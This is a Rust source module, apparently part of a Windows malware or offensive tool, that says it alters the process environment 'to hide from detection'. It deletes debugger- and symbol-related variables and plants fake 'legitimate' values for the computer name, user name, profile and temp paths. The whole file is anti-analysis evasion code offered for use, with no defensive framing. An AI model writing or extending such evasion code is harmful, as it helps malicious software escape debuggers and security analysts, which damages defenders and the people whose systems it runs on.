// Environment Block Manipulation
// Modifies environment variables to hide from detection

use winapi::um::winbase::*;
use winapi::um::processenv::*;
use winapi::shared::minwindef::*;
use std::ptr;
use std::ffi::CString;

/// Clear suspicious environment variables
pub unsafe fn clear_suspicious_env_vars() -> Result<(), String> {
    let suspicious_vars = [
        "PROCESSOR_ARCHITEW6432",
        "_NT_SYMBOL_PATH",
        "DBGENG_DLL",
        "NT_SYMBOL_PATH",
    ];
    
    for var in &suspicious_vars {
        let var_cstr = CString::new(*var).unwrap();
        SetEnvironmentVariableA(
            var_cstr.as_ptr() as *const i8,
            ptr::null(),
        );
    }
    
    Ok(())
}

/// Add fake legitimate environment variables
pub unsafe fn add_fake_env_vars() -> Result<(), String> {
    let fake_vars = [
        ("COMPUTERNAME", "DESKTOP-LEGITIMATE"),
        ("USERNAME", "User"),
        ("USERPROFILE", "C:\\Users\\User"),
        ("TEMP", "C:\\Users\\User\\AppData\\Local\\Temp"),
        ("TMP", "C:\\Users\\User\\AppData\\Local\\Temp"),
    ];
    
    for (name, value) in &fake_vars {
        let name_cstr = CString::new(*name).unwrap();
        let value_cstr = CString::new(*value).unwrap();
        
        SetEnvironmentVariableA(
            name_cstr.as_ptr() as *const i8,
            value_cstr.as_ptr() as *const i8,
        );
    }
    
    Ok(())
}

/// Manipulate environment block
pub unsafe fn manipulate_environment() -> Result<(), String> {
    // Clear suspicious variables
    clear_suspicious_env_vars()?;
    
    // Add fake legitimate variables
    add_fake_env_vars()?;
    
    Ok(())
}

/// Get environment variable (helper)
pub unsafe fn get_env_var(name: &str) -> Option<String> {
    let name_cstr = CString::new(name).ok()?;
    let mut buffer = vec![0u8; 1024];
    let len = GetEnvironmentVariableA(
        name_cstr.as_ptr() as *const i8,
        buffer.as_mut_ptr() as *mut i8,
        buffer.len() as u32,
    );
    
    if len == 0 || len as usize > buffer.len() {
        return None;
    }
    
    buffer.truncate(len as usize);
    String::from_utf8(buffer).ok()
}
